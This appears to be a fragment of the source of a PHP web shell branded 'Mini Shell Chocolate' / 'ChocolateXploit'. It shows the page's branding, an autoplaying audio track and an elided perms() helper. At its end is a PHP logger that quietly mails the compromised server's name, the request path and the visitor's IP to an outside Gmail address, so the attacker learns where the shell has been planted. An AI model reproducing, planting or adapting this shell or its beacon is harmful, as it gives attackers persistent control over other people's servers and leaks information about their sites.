...
<title>MINI SH3LL Chocolate</title><link rel="SHORTCUT ICON"  href="https://e.top4top.io/p_1832e2drk0.png">
<style>
body{ 
...
<H1><center>Mini Shell Chocolate</center></H1>
<DIV align=center><IMG src="https://e.top4top.io/p_1832e2drk0.png" width=250 height=250><br>
...
echo '<br />
<center>
<audio src="https://l.top4top.io/m_1792lj25e0.mp3" type="audio/mpeg" controls="controls" autoplays="autoplays"></audio>
<br>
<a href="https://www.youtube.com/channel/UCN2GrmWH8QQsMrtQbWKQzbg"><b><h3><font face="courier new" color="yellow">ChocolateXploit</font></h3></b></a>
</center>
</BODY>
</HTML>';
function perms($file){
...
?>
<?php @ini_set('output_buffering', 0); @ini_set('display_errors', 0); set_time_limit(0); ini_set('memory_limit', '64M'); header('Content-Type: text/html; charset=UTF-8'); $tujuanmail = 'Lu_ubah@gmail.com'; $x_path = "https://www.youtube.com/channel/UCN2GrmWH8QQsMrtQbWKQzbg" . $_SERVER['SERVER_NAME'] . $_SERVER['REQUEST_URI']; $pesan_alert = "fix $x_path :p *IP Address : [ " . $_SERVER['REMOTE_ADDR'] . " ]"; mail($tujuanmail, "LOGGER", $pesan_alert, "[ " . $_SERVER['REMOTE_ADDR'] . " ]"); ?>